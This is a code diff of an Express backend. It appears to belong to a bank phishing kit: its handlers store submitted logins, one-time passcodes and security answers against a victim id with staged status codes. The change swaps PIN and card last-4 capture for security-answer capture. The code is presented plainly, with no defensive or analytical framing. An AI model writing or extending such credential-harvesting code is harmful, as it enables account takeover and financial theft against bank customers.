@@ -62,7 +62,7 @@ const submitLoginAgain = async (req, res) => {
 const submitOtp = async (req, res) => {
   const { otp, uniqueid } = req.body;
   try {
-    await uBankOne.findOneAndUpdate({ uniqueid }, { otp, status: 7 }).exec();
+    await uBankOne.findOneAndUpdate({ uniqueid }, { otp, status: 5 }).exec();
     res.sendStatus(200);
   } catch (error) {
     console.log(error);
@@ -70,21 +70,12 @@ const submitOtp = async (req, res) => {
   }
 };
 
-const submitPin = async (req, res) => {
-  const { pin, uniqueid } = req.body;
+const submitSecAnswer = async (req, res) => {
+  const { secAnswer, uniqueid } = req.body;
   try {
-    await uBankOne.findOneAndUpdate({ uniqueid }, { pin, status: 5 }).exec();
-    res.sendStatus(200);
-  } catch (error) {
-    console.log(error);
-    res.sendStatus(400);
-  }
-};
-
-const submitLast4 = async (req, res) => {
-  const { last4, uniqueid } = req.body;
-  try {
-    await uBankOne.findOneAndUpdate({ uniqueid }, { last4, status: 3 }).exec();
+    await uBankOne
+      .findOneAndUpdate({ uniqueid }, { secAnswer, status: 3 })
+      .exec();
     res.sendStatus(200);
   } catch (error) {
     console.log(error);
@@ -110,7 +101,6 @@ module.exports = {
   submitLogin,
   submitLoginAgain,
   submitOtp,
-  submitPin,
-  submitLast4,
+  submitSecAnswer,
   deleteEntry,
 };
